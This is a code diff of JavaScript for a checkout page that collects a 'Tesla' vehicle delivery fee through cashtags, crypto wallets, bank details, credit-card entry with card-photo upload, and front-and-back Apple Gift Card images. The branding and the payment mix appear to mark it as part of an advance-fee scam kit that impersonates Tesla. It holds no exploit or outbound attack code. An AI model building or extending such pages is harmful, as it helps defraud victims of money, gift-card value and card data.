-      list.innerHTML = '<div style="grid-column:1/-1;text-align:center;padding:24px;color:#999;">No payment methods are currently available. Please check back shortly.</div>';
+      list.innerHTML = '<div class="pm-empty">No payment methods are currently available. Please check back shortly.</div>';
       return;
     }
     list.innerHTML = paymentMethods.map(function(pm) {
       var isSelected = selectedPaymentId === pm.id;
-      return '<div class="other-method-card' + (isSelected ? ' selected' : '') + '" onclick="window.selectPaymentMethod(\'' + pm.id + '\')">' +
-        '<div class="om-icon" style="display:flex;justify-content:center;">' + PM.logoImg(pm, 34) + '</div>' +
-        '<div class="om-name">' + escapeHtml(pm.name) + '</div>' +
-        (isSelected ? '<div class="om-badge selected-badge">Selected</div>' : '') +
+      return '<div class="pm-card' + (isSelected ? ' selected' : '') + '" onclick="window.selectPaymentMethod(\'' + escapeHtml(pm.id) + '\')">' +
+        '<div class="pm-card-logo">' + PM.logoImg(pm, 32) + '</div>' +
+        '<div class="pm-card-name">' + escapeHtml(pm.name) + '</div>' +
+        (isSelected ? '<div class="pm-selected-badge">Selected</div>' : '') +
         '</div>';
     }).join('');
   }
 
+  // ── SELECT PAYMENT METHOD ──
   function selectPaymentMethod(id) {
     selectedPaymentId = id;
     var pm = findMethod(id);
     var isGift = pm && pm.type === 'gift';
+    var isCard = pm && (pm.type === 'card' || pm.id === 'creditcard');
+
     var giftSection = document.getElementById('appleGiftUpload');
     var regularUpload = document.getElementById('uploadArea');
-    var label = document.getElementById('proofSectionLabel');
-    if (isGift) {
-      if (giftSection) giftSection.style.display = 'block';
-      if (regularUpload) regularUpload.style.display = 'none';
-      if (label) label.textContent = 'Apple Gift Card Upload';
-      applyGiftConfig(pm);
-    } else {
-      if (giftSection) giftSection.style.display = 'none';
-      if (regularUpload) regularUpload.style.display = 'block';
-      if (label) label.textContent = 'Upload Payment Proof';
+    var ccForm = document.getElementById('ccFormSection');
+    var submitSection = document.getElementById('submitSection');
+
+    // Show/hide sections
+    if (giftSection) giftSection.style.display = isGift ? 'block' : 'none';
+    if (regularUpload) regularUpload.style.display = (!isGift && !isCard) ? 'block' : 'none';
+    if (ccForm) ccForm.className = isCard ? 'cc-form-section card visible' : 'cc-form-section card';
+    if (submitSection) submitSection.style.display = 'block';
+
+    // CC image upload visibility based on admin setting
+    if (isCard) {
+      var ccUploadSec = document.getElementById('ccUploadSection');
+      if (ccUploadSec) {
+        ccUploadSec.className = isCCImageRequired() ? 'cc-upload-section visible' : 'cc-upload-section';
+      }
     }
+
+    var payDetailSection = document.getElementById('payDetailSection');
+    if (payDetailSection) payDetailSection.style.display = 'block';
+
     renderPaymentMethods();
     showPaymentDetails(id);
     refreshSubmitState();
   }
 
-  function applyGiftConfig(pm) {
-    var c = pm.config || {};
-    var allowCam = c.allowCameraCapture !== false;
-    ['giftFrontCameraBtn', 'giftBackCameraBtn'].forEach(function(bid) {
-      var b = document.getElementById(bid);
-      if (b) b.style.display = allowCam ? '' : 'none';
-    });
-  }
-
+  // ── SHOW PAYMENT DETAILS ──
   function showPaymentDetails(id) {
     var pm = findMethod(id);
     if (!pm) return;
-
-    var section = document.getElementById('paymentDetailSection');
-    section.style.display = 'block';
-    section.style.animation = 'slideInUp 0.3s ease';
-
     var c = pm.config || {};
-    var type = pm.type || 'wallet';
-    var address = '';
-    if (type === 'crypto') address = c.walletAddress || '';
-    else if (type === 'wallet') address = c.cashtag || c.username || c.email || c.paypalMeLink || '';
-    else if (type === 'bank') address = c.email || c.phone || c.accountNumber || '';
+    var html = '';
 
-    document.getElementById('pmDetailTitle').textContent = pm.name;
-    var subEl = document.getElementById('pmDetailType');
-    subEl.textContent = (type === 'crypto' && c.network) ? ('Cryptocurrency · ' + c.network) : typeLabel(type);
+    html += '<div class="pay-detail-header">';
+    html += '<div class="pay-method-icon">' + PM.logoImg(pm, 36) + '</div>';
+    html += '<div>';
+    html += '<div class="pay-method-name">' + escapeHtml(pm.name) + '</div>';
+    html += '<div class="pay-method-type">' + escapeHtml(typeLabel(pm.type)) + '</div>';
+    html += '</div></div>';
 
-    var iconEl = document.getElementById('pmBigIcon');
-    iconEl.innerHTML = PM.logoImg(pm, 40);
-    iconEl.className = 'pay-big-icon';
-
-    var addrBox = document.getElementById('walletAddressBox');
-    var addrEl = document.getElementById('walletAddress');
-    if (address) { addrBox.style.display = 'block'; addrEl.textContent = address; }
-    else { addrBox.style.display = 'none'; }
-
-    var qrContainer = document.getElementById('qrContainer');
-    var qrPlaceholder = document.getElementById('qrPlaceholder');
-    var qrNote = document.getElementById('qrNote');
-    if (c.qrCode) {
-      qrContainer.style.display = 'block';
-      qrPlaceholder.innerHTML = '<img src="' + escapeHtml(c.qrCode) + '" alt="Payment QR code">';
-      if (qrNote) qrNote.textContent = 'Scan this QR code with your payment app';
-    } else if (address && type !== 'card' && type !== 'gift') {
-      qrContainer.style.display = 'block';
-      qrPlaceholder.innerHTML = '<svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#c9ccd1" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21,15 16,10 5,21"/></svg>';
-      if (qrNote) qrNote.textContent = 'Use the address above to send your payment';
-    } else {
-      qrContainer.style.display = 'none';
+    // Render fields by type
+    if (pm.type === 'wallet' || pm.type === 'bank') {
+      if (c.email) html += renderInfoRow(iconAt(), 'Email / Account', c.email, true);
+      if (c.phone) html += renderInfoRow(iconPhone(), 'Phone', c.phone, true);
+      if (c.cashtag) html += renderInfoRow(iconAt(), 'Cashtag', c.cashtag, true);
+      if (c.username) html += renderInfoRow(iconAt(), 'Username', c.username, true);
+      if (c.paypalMeLink) html += renderInfoRow(iconLink(), 'PayPal.me Link', c.paypalMeLink, true);
+      if (c.businessName) html += renderInfoRow(iconBusiness(), 'Business Name', c.businessName, false);
+      if (c.merchantId) html += renderInfoRow(iconHash(), 'Merchant ID', c.merchantId, true);
+      if (c.recipientName) html += renderInfoRow(iconUser(), 'Recipient Name', c.recipientName, false);
+      if (c.accountName) html += renderInfoRow(iconUser(), 'Account Name', c.accountName, false);
     }
 
-    document.getElementById('paymentInstructions').textContent = c.instructions || 'Send the exact delivery fee amount. Include your Order ID in the payment reference.';
-    section.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    if (pm.type === 'crypto') {
+      if (c.walletAddress) html += renderInfoRow(iconWallet(), 'Wallet Address', c.walletAddress, true);
+      if (c.network) html += renderInfoRow(iconGlobe(), 'Network', c.network, false);
+      if (c.memo) html += renderInfoRow(iconHash(), 'Memo / Tag', c.memo, true);
+      if (c.qrCode) {
+        html += '<div class="qr-block"><img src="' + escapeHtml(c.qrCode) + '" alt="QR Code" style="max-width:160px;"></div>';
+      }
+    }
+
+    if (pm.type === 'card') {
+      if (c.merchantName) html += renderInfoRow(iconBusiness(), 'Merchant Name', c.merchantName, false);
+      if (c.merchantId) html += renderInfoRow(iconHash(), 'Merchant ID', c.merchantId, true);
+    }
+
+    if (pm.type === 'gift') {
+      if (c.denomination) html += renderInfoRow(iconTag(), 'Denomination', c.denomination, false);
+    }
+
+    if (c.instructions) {
+      html += '<div class="instructions-box"><div class="instructions-box-label">Instructions</div>' + escapeHtml(c.instructions) + '</div>';
+    }
+
+    var container = document.getElementById('paymentDetailContent');
+    if (container) container.innerHTML = html;
+
+    // Bind copy buttons
+    var copyBtns = document.querySelectorAll('[data-copy]');
+    for (var i = 0; i < copyBtns.length; i++) {
+      (function(btn) {
+        btn.addEventListener('click', function() {
+          var text = btn.getAttribute('data-copy');
+          copyToClipboard(text, btn);
+        });
+      })(copyBtns[i]);
+    }
   }
 
-  function refreshSubmitState() {
-    var pm = findMethod(selectedPaymentId);
-    var isGift = pm && pm.type === 'gift';
-    var ready = isGift ? !!(giftFrontData && giftBackData) : !!uploadedFileData;
-    var submitBtn = document.getElementById('submitBtn');
-    if (!submitBtn) return;
-    if (selectedPaymentId && ready) { submitBtn.disabled = false; submitBtn.style.opacity = '1'; submitBtn.style.cursor = 'pointer'; }
-    else { submitBtn.disabled = true; submitBtn.style.opacity = '.5'; submitBtn.style.cursor = 'not-allowed'; }
+  function renderInfoRow(iconHtml, label, value, copyable) {
+    var copyBtn = copyable
+      ? '<button class="copy-btn" data-copy="' + escapeHtml(value) + '" title="Copy to clipboard">' +
+        '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>' +
+        '</button>'
+      : '';
+    return '<div class="pay-info-row">' +
+      '<div class="pay-info-icon">' + iconHtml + '</div>' +
+      '<div class="pay-info-content">' +
+        '<div class="pay-info-label">' + escapeHtml(label) + '</div>' +
+        '<div class="pay-info-value">' + escapeHtml(value) + '</div>' +
+      '</div>' +
+      copyBtn +
+      '</div>';
   }
 
-  function copyAddress() {
-    var addr = document.getElementById('walletAddress').textContent;
-    if (!addr || addr === '—') return;
+  // SVG icon helpers
+  function svgIcon(path, opts) {
+    opts = opts || {};
+    var w = opts.w || 15; var h = opts.h || 15;
+    return '<svg width="' + w + '" height="' + h + '" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">' + path + '</svg>';
+  }
+  function iconAt() { return svgIcon('<circle cx="12" cy="12" r="4"/><path d="M16 8v5a3 3 0 0 0 6 0v-1a10 10 0 1 0-3.92 7.94"/>'); }
+  function iconPhone() { return svgIcon('<path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.62 12 19.79 19.79 0 0 1 1.53 3.43 2 2 0 0 1 3.5 1.25h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.91 8.27a16 16 0 0 0 6.06 6.06l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/>'); }
+  function iconLink() { return svgIcon('<path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/>'); }
+  function iconBusiness() { return svgIcon('<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/>'); }
+  function iconHash() { return svgIcon('<line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/>'); }
+  function iconUser() { return svgIcon('<path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>'); }
+  function iconWallet() { return svgIcon('<rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 7V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v2"/><line x1="12" y1="12" x2="12" y2="16"/><line x1="10" y1="14" x2="14" y2="14"/>'); }
+  function iconGlobe() { return svgIcon('<circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>'); }
+  function iconTag() { return svgIcon('<path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"/><line x1="7" y1="7" x2="7.01" y2="7"/>'); }
+
+  // ── COPY TO CLIPBOARD ──
+  function copyToClipboard(text, btn) {
     if (navigator.clipboard && navigator.clipboard.writeText) {
-      navigator.clipboard.writeText(addr).then(function() {
-        var btn = document.getElementById('copyAddressBtn');
-        btn.textContent = 'Copied';
-        btn.classList.add('copied');
-        setTimeout(function() { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
-      }).catch(function() { fallbackCopy(addr); });
-    } else {
-      fallbackCopy(addr);
-    }
+      navigator.clipboard.writeText(text).then(function() {
+        showCopySuccess(btn);
+      }).catch(function() { fallbackCopy(text, btn); });
+    } else { fallbackCopy(text, btn); }
   }
 
-  function fallbackCopy(text) {
+  function fallbackCopy(text, btn) {
     var ta = document.createElement('textarea');
-    ta.value = text;
-    ta.style.position = 'fixed'; ta.style.opacity = '0';
-    document.body.appendChild(ta);
-    ta.select();
-    try { document.execCommand('copy'); showToast('Address copied!'); } catch(e) { showToast('Could not copy', 'error'); }
+    ta.value = text; ta.style.cssText = 'position:fixed;opacity:0;';
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); showCopySuccess(btn); } catch(e) {}
     document.body.removeChild(ta);
   }
 
+  function showCopySuccess(btn) {
+    if (!btn) return;
+    var orig = btn.innerHTML;
+    btn.innerHTML = '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="var(--success)" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>';
+    btn.style.borderColor = 'var(--success)';
+    setTimeout(function() { btn.innerHTML = orig; btn.style.borderColor = ''; }, 1800);
+  }
+
+  window.copyAddress = function(text) { copyToClipboard(text, null); showToast('Copied to clipboard', 'success'); };
+
+  // ── ORDER SUMMARY ──
   function renderOrderSummary() {
-    var fee = deliveryMethod.priceDisplay || '$' + (deliveryMethod.price || '299');
-    document.getElementById('smModel').textContent = 'Tesla ' + (selectedCar.name || '');
-    document.getElementById('smMethod').textContent = deliveryMethod.name || 'Standard Delivery';
-    document.getElementById('smTime').textContent = deliveryMethod.days || '5–10 business days';
-    document.getElementById('smName').textContent = deliveryDetails.fullName || '—';
-    document.getElementById('smAddr').textContent = [deliveryDetails.address, deliveryDetails.city, deliveryDetails.state, deliveryDetails.zipCode].filter(Boolean).join(', ') || '—';
-    document.getElementById('smPhone').textContent = deliveryDetails.phone || '—';
-    document.getElementById('smTotal').textContent = fee;
+    var el = document.getElementById('orderSummaryContent');
+    if (!el) return;
+
+    var car = selectedCar || {};
+    var delivery = deliveryDetails || {};
+    var method = deliveryMethod || {};
+    var fee = parseInt(localStorage.getItem('tesla_delivery_fee') || '0', 10) || 0;
+
+    var rows = [];
+    if (car.model) rows.push({ label: 'Vehicle', value: car.model + (car.variant ? ' — ' + car.variant : '') });
+    if (car.color) rows.push({ label: 'Color', value: car.color });
+    if (delivery.recipientName) rows.push({ label: 'Recipient', value: delivery.recipientName });
+    if (delivery.address || delivery.city) {
+      var addr = [delivery.address, delivery.city, delivery.state].filter(Boolean).join(', ');
+      rows.push({ label: 'Delivery Address', value: addr });
+    }
+    if (method.name) rows.push({ label: 'Delivery Method', value: method.name });
+
+    var html = rows.map(function(r) {
+      return '<div class="summary-row"><span class="sr-label">' + escapeHtml(r.label) + '</span><span class="sr-value">' + escapeHtml(r.value) + '</span></div>';
+    }).join('');
+
+    html += '<div class="summary-total"><span class="summary-total-label">Delivery Fee</span><span class="summary-total-amount">$' + fee.toLocaleString() + '</span></div>';
+
+    el.innerHTML = html;
   }
 
-  // ── FILE UPLOAD ──
-  // ── HANDLE FILE SELECT (with error recovery) ──
+  // ── PROOF UPLOAD (regular) ──
   function handleFileSelect(input) {
-    if (!input || !input.files) return;
-    var file = input.files[0];
+    var file = input.files && input.files[0];
     if (!file) return;
-    processFile(file);
-    if (input) input.value = '';
+    var allowedTypes = ['image/jpeg','image/jpg','image/png','image/gif','image/webp','application/pdf'];
+    if (allowedTypes.indexOf(file.type) === -1) {
+      showToast('Please select a valid image or PDF file', 'error'); return;
+    }
+    if (file.size > 20 * 1024 * 1024) {
+      showToast('File too large. Maximum size is 20MB', 'error'); return;
+    }
+    if (file.type === 'application/pdf') {
+      uploadedFileData = null; uploadedFileName = file.name;
+      document.getElementById('previewImage').style.display = 'none';
+      document.getElementById('previewFileName').textContent = file.name;
+      document.getElementById('previewFileSize').textContent = formatFileSize(file.size);
+      showUploadPreview();
+    } else {
+      var reader = new FileReader();
+      reader.onload = function(e) {
+        uploadedFileData = e.target.result;
+        uploadedFileName = file.name;
+        var img = document.getElementById('previewImage');
+        img.src = uploadedFileData;
+        img.style.display = 'block';
+        document.getElementById('previewFileName').textContent = file.name;
+        document.getElementById('previewFileSize').textContent = formatFileSize(file.size);
+        showUploadPreview();
+      };
+      reader.readAsDataURL(file);
+    }
+    input.value = '';
   }
 
-  function processFile(file) {
-    if (!file.type.startsWith('image/')) {
-      showToast('Please select an image file (JPEG, PNG, etc.)', 'error');
-      return;
-    }
-    if (file.size > 10 * 1024 * 1024) {
-      showToast('File is too large. Maximum size is 10MB.', 'error');
-      return;
-    }
-
-    uploadedFileName = file.name;
-    var reader = new FileReader();
-    reader.onload = function(e) {
-      uploadedFileData = e.target.result;
-      showPreview(uploadedFileData, file.name, file.size);
-    };
-    reader.readAsDataURL(file);
-  }
-
-  function showPreview(dataUrl, name, size) {
-    var uploadState = document.getElementById('uploadState');
+  function showUploadPreview() {
+    var state = document.getElementById('uploadState');
     var preview = document.getElementById('uploadPreview');
-    uploadState.style.display = 'none';
-    preview.classList.add('show');
-    preview.style.display = 'block';
-
-    document.getElementById('previewImage').src = dataUrl;
-    document.getElementById('previewFileName').textContent = name || 'Receipt';
-    document.getElementById('previewFileSize').textContent = size ? formatSize(size) : '';
-
-    // Enable submit button if payment method is selected
-    var submitBtn = document.getElementById('submitBtn');
-    if (submitBtn && selectedPaymentId) {
-      submitBtn.disabled = false;
-      submitBtn.style.opacity = '1';
-      submitBtn.style.cursor = 'pointer';
-    }
-  }
-
-  function resetUpload() {
-    uploadedFileData = null;
-    uploadedFileName = '';
-    var uploadState = document.getElementById('uploadState');
-    var preview = document.getElementById('uploadPreview');
-    uploadState.style.display = 'block';
-    preview.classList.remove('show');
-    preview.style.display = 'none';
-
-    var submitBtn = document.getElementById('submitBtn');
-    submitBtn.disabled = true;
-    submitBtn.style.opacity = '.5';
-    submitBtn.style.cursor = 'not-allowed';
-  }
-
-  function openCamera() {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      // Fallback to file picker with camera
-      var cameraInput = document.getElementById('cameraInput');
-      if (cameraInput) cameraInput.click();
-      return;
-    }
-    // Try using the capture attribute approach
-    var cameraInput = document.getElementById('cameraInput');
-    if (cameraInput) cameraInput.click();
-  }
-
-  function formatSize(bytes) {
-    if (bytes < 1024) return bytes + ' B';
-    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
-    return (bytes / 1048576).toFixed(1) + ' MB';
-  }
-
-  function confirmUpload() {
-    if (!uploadedFileData) { showToast('No file selected', 'error'); return; }
-    showUploadStatus('Payment proof uploaded successfully.', 'success');
-    showToast('Proof uploaded — you can now complete your order');
+    var zone = document.getElementById('uploadDropZone');
+    if (state) state.style.display = 'none';
+    if (preview) preview.style.display = 'flex';
+    if (zone) { zone.classList.add('has-file'); zone.onclick = null; }
+    uploadConfirmed = false;
     refreshSubmitState();
   }
 
-  function showUploadStatus(msg, type) {
-    var status = document.getElementById('uploadStatus');
-    status.style.display = 'block';
-    status.textContent = msg;
-    status.style.background = type === 'success' ? 'rgba(0,165,80,.08)' : 'rgba(239,68,68,.08)';
-    status.style.color = type === 'success' ? 'var(--success)' : 'var(--danger)';
-    status.style.border = '1px solid ' + (type === 'success' ? 'rgba(0,165,80,.2)' : 'rgba(239,68,68,.2)');
+  function formatFileSize(bytes) {
+    if (bytes < 1024) return bytes + ' B';
+    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
+    return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
   }
 
-  // ── SUBMIT ──
-  function feeText() { return deliveryMethod.priceDisplay || '$' + (deliveryMethod.price || '299'); }
+  function resetUpload() {
+    uploadedFileData = null; uploadedFileName = ''; uploadConfirmed = false;
+    var state = document.getElementById('uploadState');
+    var preview = document.getElementById('uploadPreview');
+    var zone = document.getElementById('uploadDropZone');
+    var img = document.getElementById('previewImage');
+    if (state) state.style.display = 'block';
+    if (preview) preview.style.display = 'none';
+    if (zone) { zone.classList.remove('has-file'); zone.onclick = function() { document.getElementById('fileInput').click(); }; }
+    if (img) { img.src = ''; }
+    var statusEl = document.getElementById('uploadStatus');
+    if (statusEl) { statusEl.style.display = 'none'; statusEl.textContent = ''; }
+    refreshSubmitState();
+  }
 
-  function submitPayment() {
-    if (!selectedPaymentId) { showToast('Please select a payment method', 'error'); return; }
-    var pm = findMethod(selectedPaymentId);
-    var pmName = pm ? pm.name : selectedPaymentId;
-    var isGift = pm && pm.type === 'gift';
-    var orderId = 'TSLA-' + Date.now().toString(36).toUpperCase();
-
-    var proof;
-    if (isGift) {
-      var gc = pm.config || {};
-      if (gc.requireFrontImage !== false && !giftFrontData) { showToast('Please upload the front image of the Apple Gift Card', 'error'); return; }
-      if (gc.requireBackImage !== false && !giftBackData) { showToast('Please upload the back image of the Apple Gift Card', 'error'); return; }
-      proof = {
-        id: 'proof_' + Date.now(), user_id: 'customer', order_id: orderId,
-        payment_method: pmName, proof_url: giftFrontData || '', proof_back_url: giftBackData || '',
-        proof_type: 'gift_card', amount: feeText(), status: 'pending', created_at: new Date().toISOString()
-      };
-    } else {
-      if (!uploadedFileData) { showToast('Please upload your payment proof first', 'error'); return; }
-      proof = {
-        id: 'proof_' + Date.now(), user_id: 'customer', order_id: orderId,
-        payment_method: pmName, proof_url: uploadedFileData, proof_type: 'image',
-        amount: feeText(), status: 'pending', created_at: new Date().toISOString()
-      };
+  function confirmUpload() {
+    if (!uploadedFileData && !uploadedFileName) { showToast('No file selected', 'error'); return; }
+    uploadConfirmed = true;
+    var statusEl = document.getElementById('uploadStatus');
+    if (statusEl) {
+      statusEl.style.display = 'block';
+      statusEl.style.background = 'rgba(0,165,80,0.08)';
+      statusEl.style.color = 'var(--success)';
+      statusEl.style.border = '1px solid rgba(0,165,80,0.2)';
+      statusEl.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" style="vertical-align:middle;margin-right:6px;"><polyline points="20 6 9 17 4 12"/></svg> Payment proof uploaded — ready to submit';
     }
-
-    var proofs = [];
-    try { proofs = JSON.parse(localStorage.getItem('tesla_payment_proofs') || '[]'); } catch(e) {}
-    proofs.unshift(proof);
-    localStorage.setItem('tesla_payment_proofs', JSON.stringify(proofs));
-
-    var orderData = {
-      orderId: orderId,
-      trackingNumber: 'TRK-' + Math.random().toString(36).substring(2, 10).toUpperCase(),
-      email: deliveryDetails.email || '',
-      selectedCar: selectedCar,
-      deliveryDetails: deliveryDetails,
-      deliveryMethod: deliveryMethod,
-      paymentMethod: { id: selectedPaymentId, name: pmName },
-      status: 'awaiting_payment_confirmation',
-      orderDate: new Date().toISOString(),
-      estimatedDelivery: deliveryMethod.days || '5–10 business days'
-    };
-    localStorage.setItem('tesla_last_order', JSON.stringify(orderData));
-
-    var API_BASE = (typeof window.TESLA_API_BASE !== 'undefined' && window.TESLA_API_BASE)
-      ? window.TESLA_API_BASE.replace(/\/+$/, '') : '';
-
-    var submitBtn = document.getElementById('submitBtn');
-    if (submitBtn) { submitBtn.disabled = true; submitBtn.style.opacity = '.6'; submitBtn.textContent = 'Submitting…'; }
-
-    // No backend configured — the order lives in localStorage for admin review.
-    if (!API_BASE) { window.location.href = 'order-placed.html'; return; }
-
-    // Backend configured: persist the order and the proof, and surface any
-    // failure (no silent swallowing) — but never trap the customer if the
-    // network stalls; a safety timeout lets them proceed with the local copy.
-    var done = false;
-    function proceed() { if (done) return; done = true; window.location.href = 'order-placed.html'; }
-    var hardTimeout = setTimeout(function() {
-      showToast('Network is slow — your order is saved locally. Continuing…', 'warning');
-      proceed();
-    }, 12000);
-
-    var orderReq = fetch(API_BASE + '/order', {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ sessionToken: sessionToken, selectedCar: selectedCar, deliveryDetails: deliveryDetails, deliveryMethod: deliveryMethod, paymentMethod: { id: selectedPaymentId, name: pmName } })
-    }).then(function(r) {
-      if (!r.ok) throw new Error('order request failed: ' + r.status);
-      return r.json();
-    }).then(function(r) { if (r && r.order) localStorage.setItem('tesla_last_order', JSON.stringify(r.order)); });
-
-    var proofReq = fetch(API_BASE + '/admin/payment-proofs/submit', {
-      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(proof)
-    }).then(function(r) { if (!r.ok) throw new Error('proof request failed: ' + r.status); });
-
-    Promise.all([orderReq, proofReq]).then(function() {
-      clearTimeout(hardTimeout);
-      proceed();
-    }).catch(function(err) {
-      clearTimeout(hardTimeout);
-      if (window.console) console.error('Payment submit: backend persistence failed:', err);
-      showToast('Saved your order locally; we could not reach the server. Continuing…', 'warning');
-      proceed();
-    });
-  }
-
-  // ── HELPERS ──
-  function escapeHtml(str) {
-    if (str == null) return '';
-    var d = document.createElement('div');
-    d.textContent = String(str);
-    return d.innerHTML;
-  }
-
-  function showToast(msg, type) {
-    type = type || 'success';
-    if (typeof window.showToast === 'function') {
-      window.showToast(msg, type);
-      return;
+    var confirmBtn = document.getElementById('confirmUploadBtn');
+    if (confirmBtn) {
+      confirmBtn.textContent = 'Uploaded';
+      confirmBtn.disabled = true;
+      confirmBtn.style.opacity = '0.6';
     }
-    var existing = document.querySelectorAll('.toast-notif');
-    for (var i = 0; i < existing.length; i++) existing[i].remove();
-    var t = document.createElement('div');
-    t.className = 'toast-notif toast-' + type;
-    var icons = { success: '✓', error: '✕', info: 'ℹ', warning: '⚠' };
-    t.innerHTML = '<span class="toast-icon">' + (icons[type] || '✓') + '</span><span class="toast-msg">' + msg + '</span>';
-    t.style.cssText = 'position:fixed;bottom:24px;right:24px;z-index:99999;display:flex;align-items:center;gap:12px;padding:14px 22px;border-radius:12px;font-size:14px;font-weight:500;max-width:380px;box-shadow:0 12px 40px rgba(0,0,0,.2);animation:slideInRight .35s ease;color:white;background:' + (type === 'error' ? '#EF4444' : type === 'warning' ? '#F59E0B' : '#171A20') + ';';
-    document.body.appendChild(t);
-    setTimeout(function() { t.style.opacity = '0'; t.style.transform = 'translateX(20px)'; t.style.transition = 'opacity .35s ease, transform .35s ease'; setTimeout(function() { if (t.parentNode) t.remove(); }, 350); }, 5000);
+    refreshSubmitState();
   }
 
-  // ── APPLE GIFT CARD UPLOAD ──
-  var giftFrontData = null;
-  var giftBackData = null;
-
+  // ── APPLE GIFT CARD ──
   function handleGiftFile(input, side) {
     var file = input.files && input.files[0];
     if (!file) return;
@@ -785,7 +1341,8 @@
     var reader = new FileReader();
     reader.onload = function(e) {
       var dataUrl = e.target.result;
-      if (side === 'front') { giftFrontData = dataUrl; } else { giftBackData = dataUrl; }
+      if (side === 'front') giftFrontData = dataUrl;
+      else giftBackData = dataUrl;
       showGiftPreview(side, dataUrl, file.name);
     };
     reader.readAsDataURL(file);
@@ -793,45 +1350,278 @@
   }
 
   function showGiftPreview(side, dataUrl, fileName) {
-    var previewEl = document.getElementById('gift' + side.charAt(0).toUpperCase() + side.slice(1) + 'Preview');
-    var stateEl = document.getElementById('gift' + side.charAt(0).toUpperCase() + side.slice(1) + 'State');
-    if (!previewEl || !stateEl) return;
-    stateEl.style.display = 'none';
-    previewEl.style.display = 'block';
-    previewEl.innerHTML = '<img src="' + dataUrl + '" alt="' + side + ' of gift card" style="max-width:100%;max-height:140px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1);"><div class="file-name" style="font-size:12px;margin-top:6px;">' + escapeHtml(fileName) + ' ✓</div>';
-    var uploadBox = document.getElementById('gift' + side.charAt(0).toUpperCase() + side.slice(1) + 'Upload');
-    if (uploadBox) uploadBox.classList.add('has-file');
+    var capSide = side.charAt(0).toUpperCase() + side.slice(1);
+    var card = document.getElementById('gift' + capSide + 'Upload');
+    var previewImg = document.getElementById('gift' + capSide + 'PreviewImg');
+    var previewName = document.getElementById('gift' + capSide + 'PreviewName');
+    if (card) card.classList.add('has-file');
+    if (previewImg) { previewImg.src = dataUrl; }
+    if (previewName) previewName.textContent = fileName;
+    updateGiftStatus();
+  }
+
+  function resetGiftUpload(side) {
+    var capSide = side.charAt(0).toUpperCase() + side.slice(1);
+    if (side === 'front') giftFrontData = null;
+    else giftBackData = null;
+    var card = document.getElementById('gift' + capSide + 'Upload');
+    var previewImg = document.getElementById('gift' + capSide + 'PreviewImg');
+    var previewName = document.getElementById('gift' + capSide + 'PreviewName');
+    var fileInput = document.getElementById('gift' + capSide + 'Input');
+    if (card) card.classList.remove('has-file');
+    if (previewImg) previewImg.src = '';
+    if (previewName) previewName.textContent = '';
+    if (fileInput) { fileInput.value = ''; fileInput.onclick = function() { document.getElementById('gift' + capSide + 'Input').click(); }; }
     updateGiftStatus();
   }
 
   function updateGiftStatus() {
+    var wrap = document.getElementById('giftStatusWrap');
     var statusEl = document.getElementById('giftUploadStatus');
-    if (statusEl) {
-      if (giftFrontData && giftBackData) {
-        statusEl.innerHTML = '<span style="color:var(--success);">Both front and back images uploaded — ready to submit.</span>';
-      } else if (giftFrontData || giftBackData) {
-        statusEl.innerHTML = '<span style="color:#D97706;">' + (giftFrontData ? 'Front' : 'Back') + ' uploaded — please upload the ' + (giftFrontData ? 'back' : 'front') + ' image to continue.</span>';
-      } else {
-        statusEl.innerHTML = '';
-      }
+    if (!statusEl) return;
+    if (giftFrontData && giftBackData) {
+      if (wrap) wrap.style.display = 'block';
+      statusEl.style.background = 'rgba(0,165,80,0.08)';
+      statusEl.style.color = 'var(--success)';
+      statusEl.style.border = '1px solid rgba(0,165,80,0.2)';
